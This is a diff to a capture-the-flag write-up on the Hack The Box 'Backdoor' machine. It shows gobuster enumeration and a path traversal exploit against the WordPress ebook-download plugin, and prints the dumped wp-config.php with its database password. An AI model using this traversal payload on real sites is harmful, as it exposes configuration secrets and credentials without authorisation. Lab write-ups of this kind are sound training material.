@@ -167,11 +167,171 @@ sudo ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit
 
 it was found that there are three vulnerabilities, but they are all plug-in vulnerabilities.
 
-<img src="/img/backdoor/search.PNG" alt="Getting-gz" width="800" height="440">
-<img src="/img/backdoor/search.PNG" alt="Getting-gz" width="800" height="440">
-<img src="/img/backdoor/search.PNG" alt="Getting-gz" width="800" height="440">
-<img src="/img/backdoor/search.PNG" alt="Getting-gz" width="800" height="440">
-<img src="/img/backdoor/search.PNG" alt="Getting-gz" width="800" height="440">
+## Look at the website content
+first add backdoor.htb to hosts
+```
+sudo nano /etc/hosts
+10.10.11.125 backdoor.htb
+```
+
+## Directory Brute Force
+gobuster finds many of the paths I already found, but als
+```
+gobuster dir -u http://backdoor.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+```
+
+# Exploit
+```
+http://backdoor.htb/wp-content/plugins/
+```
+<img src="/img/backdoor/plugin.PNG" alt="Getting-gz" width="800" height="440">
+
+```
+http://backdoor.htb/wp-content/plugins/ebook-download/
+```
+<img src="/img/backdoor/ebook.PNG" alt="Getting-gz" width="800" height="440">
+
+
+## ebook-download exploit
+Only readme.txt has content
+```
+http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
+```
+let's go to exploit-db to search for vulnerabilities
+```
+https://www.exploit-db.com/exploits/39575
+```
+
+<img src="/img/backdoor/read.PNG" alt="Getting-gz" width="800" height="440">
+
+
+## poc cve
+```
+/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
+```
+
+
+<img src="/img/backdoor/pocv.PNG" alt="Getting-gz" width="800" height="440">
+
+download wp-config.php
+<img src="/img/backdoor/wp-config.PNG" alt="Getting-gz" width="800" height="440">
+
+i found DB password in the configuration  file and try to log in to the admin user with the database password but password incorrect
+```
+../../../wp-config.php../../../wp-config.php../../../wp-config.php<?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the installation.
+ * You don't have to use the web site, you can copy this file to "wp-config.php"
+ * and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://wordpress.org/support/article/editing-wp-config-php/
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** MySQL database username */
+define( 'DB_USER', 'wordpressuser' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8' );
+
+/** The database collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+/**#@+
+ * Authentication unique keys and salts.
+ *
+ * Change these to different unique phrases! You can generate these using
+ * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
+ *
+ * You can change these at any point in time to invalidate all existing cookies.
+ * This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+
+/* That's all, stop editing! Happy blogging. */
+/** Absolute path to the WordPress directory. */
+if ( !defined('ABSPATH') )
+define('ABSPATH', dirname(__FILE__) . '/');
+/* THIS IS CUSTOM CODE CREATED AT ZEROFRACTAL TO MAKE SITE ACCESS DYNAMIC */
+$currenthost = "http://".$_SERVER['HTTP_HOST'];
+$currentpath = preg_replace('@/+$@','',dirname($_SERVER['SCRIPT_NAME']));
+$currentpath = preg_replace('/\/wp.+/','',$currentpath);
+define('WP_HOME',$currenthost.$currentpath);
+define('WP_SITEURL',$currenthost.$currentpath);
+define('WP_CONTENT_URL', $currenthost.$currentpath.'/wp-content');
+define('WP_PLUGIN_URL', $currenthost.$currentpath.'/wp-content/plugins');
+define('DOMAIN_CURRENT_SITE', $currenthost.$currentpath );
+@define('ADMIN_COOKIE_PATH', './');
+
+define( 'AUTH_KEY',         'put your unique phrase here' );
+define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
+define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
+define( 'NONCE_KEY',        'put your unique phrase here' );
+define( 'AUTH_SALT',        'put your unique phrase here' );
+define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
+define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
+define( 'NONCE_SALT',       'put your unique phrase here' );
+
+/**#@-*/
+
+/**
+ * WordPress database table prefix.
+ *
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
+ */
+$table_prefix = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ *
+ * For information on other constants that can be used for debugging,
+ * visit the documentation.
+ *
+ * @link https://wordpress.org/support/article/debugging-in-wordpress/
+ */
+define( 'WP_DEBUG', false );
+
+/* Add any custom values between this line and the "stop editing" line. */
+
+
+
+/* That's all, stop editing! Happy publishing. */
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( 'ABSPATH' ) ) {
+	define( 'ABSPATH', __DIR__ . '/' );
+}
+
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . 'wp-settings.php';
+<script>window.close()</script>
+```
 <img src="/img/backdoor/search.PNG" alt="Getting-gz" width="800" height="440">
 <img src="/img/backdoor/search.PNG" alt="Getting-gz" width="800" height="440">
 <img src="/img/backdoor/search.PNG" alt="Getting-gz" width="800" height="440">
